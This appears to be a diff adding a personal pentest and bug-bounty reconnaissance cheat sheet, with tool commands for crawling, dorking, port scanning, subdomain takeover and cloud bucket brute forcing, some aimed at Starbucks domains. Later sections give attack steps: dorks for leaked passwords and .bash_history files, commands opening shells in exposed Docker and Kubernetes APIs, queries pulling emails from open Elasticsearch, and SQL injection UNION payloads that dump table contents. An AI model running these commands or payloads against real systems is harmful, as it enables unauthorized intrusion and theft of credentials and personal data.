@@ -1,0 +1,138 @@
+contant discovary
+=> self crul to gather the urls from the page
+https://github.com/ghostlulzhacks/crawler/tree/master
+python3 crawler.py -d https://starbuck.com -l 2
+=> wayback active crawling machine
+ https://web.archive.org/
+=>commoncrawl gather url from common crawl 
+https://github.com/ghostlulzhacks/commoncrawl
+python cc.py -d <Domain> | more
+
+directory brute force
+=> gobuster
+gobuster dir -k -w <Wordlist> -u <URL>
+
+Inspecting JavaScript
+=> link finders parsing endpoints from javascript 
+https://github.com/GerbenJavado/LinkFinder
+python linkfinder.py -i <JavaScript File> -o cli
+=> jssearch to find sensetive strings or spesefic word
+python3.7 jsearch.py -u https://starbucks.com -n Starbucks
+https://github.com/incogbyte/jsearch
+
+Google Dorks
+site:<Domain Name>
+ext: <php>
+intitle:
+inurl:
+intext:
+define:
+phonebook:
+maps:
+book:
+info:
+movie:
+weather:
+related:
+link:
+=> to find third-party vendors
+site:codepad.co “Company Name” => You can sometimes find hard coded credentials here.
+site:scribd.com “Company Name” => find internal files uploaded by employees that contain passwords
+site:npmjs.com “Company Name” => to find NodeJS source code used by a company
+site:npm.runkit.com “Company Name” => to find NodeJS source code used by a company
+
+finger print
+=> port scan data 
+https://www.shodan.io/
+org:starbucks
+ssl:""
+=> Censys
+https://censys.io/
+
+=> masscan
+https://github.com/robertdavidgraham/masscan
+sudo masscan -p<Port Here> <CIDR Range Here> --exclude <Exclude IP> -- banners -oX <Out File Name>
+UI 
+https://github.com/offensive-security/masscan-web-ui
+
+web application
+=> wappalyzer for analysis web application
+provided as chrome ext or py tool 
+https://github.com/vincd/wappylyzer
+python3 main.py analyze -u <URL HERE>
+=> waf detector
+https://github.com/EnableSecurity/wafw00f
+Wafw00f <URL HERE>
+=> waf baypass
+https://github.com/0xInfection/Awesome-WAF#known-bypasses
+
+subdomain takeover
+=> https://github.com/EdOverflow/can-i-take-over-xyz
+=> subjack for domain takeover
+https://github.com/haccer/subjack
+./subjack -w <Subdomain List> -o results.txt -ssl -c fingerprints.json
+=> where this domain is pointing 
+dig <Domain Here> -> to check
+azure -> for takeover
+
+Github Dork
+filename:.bash_history DOMAIN-NAME
+https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt
+
+s3 bucket dorks
+site:.s3.amazonaws.com "Starbucks"
+
+s3 bucket brute force
+https://github.com/ghostlulzhacks/s3brute
+python amazon-s3-enum.py -w BucketNames.txt -d <Domain Here>
+
+Google storage bucket brute force 
+https://github.com/RhinoSecurityLabs/GCPBucketBrute
+python3 gcpbucketbrute.py -k <Domain Here> -u
+
+Digital ocean Spaces
+site:digitaloceanspaces.com <Domain Here>
+
+Unauthenticated Elasticsearch DB
+shodan -> port:"9200" elestic
+/_cat/indices?v
+/_stats/?pretty=1
+/_all/_search?q=email
+/_all/_search?q=_exists:email&pretty=1
+
+Exposed Docker API
+shodan -> product:docker -> exploar 
+exploit -> docker -H <host>:<port> ps
+Docker -H <host>:<port> exec -it <container name> /bin/bash
+
+Exposed Kubernetes API
+product:"Kubernetes"
+sending a GET request to the /pods endpoint.
+find [Namespace,Pod Nmae,Container Name]
+curl –insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X- Stream-Protocol-Version: channel.k8s.io” -H “Connection: upgrade” -H “Upgrade: SPDY/3.1” -X POST “https://<DOMAIN>:<PORT>/exec/<NAMESPACE>/<POD NAME>/<CONTAINER NAME>?command=<COMMAND TO EXECUTE>&input=1&output=1&tty=1”
+for excute command line 
+
+wordpress attack
+wpscan --url <URL>
+/wp-content/uploads/
+
+joomscan attack
+https://github.com/rezasp/joomscan
+perl joomscan.pl -u <URL Here>
+
+droope attack
+https://github.com/droope/droopescan
+python3 droopescan scan Drupal -u <URL Here> -t 32
+
+adobe AEM attack
+https://github.com/0ang3el/aem-hacker
+python aem_hacker.py -u <URL Here> --host <Your Public IP>
+
+SQLI
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+'union select NULL, table_name from information_schema.tables—
+'union select NULL, column_name from information_schema.columns where table_name = '<Table Name Here>'—
+' union select NULL, concat(<Column Name>,':',<Column Name 2>) from <Table Name>--
+
+CSWH
+http://websocket.org/echo.html
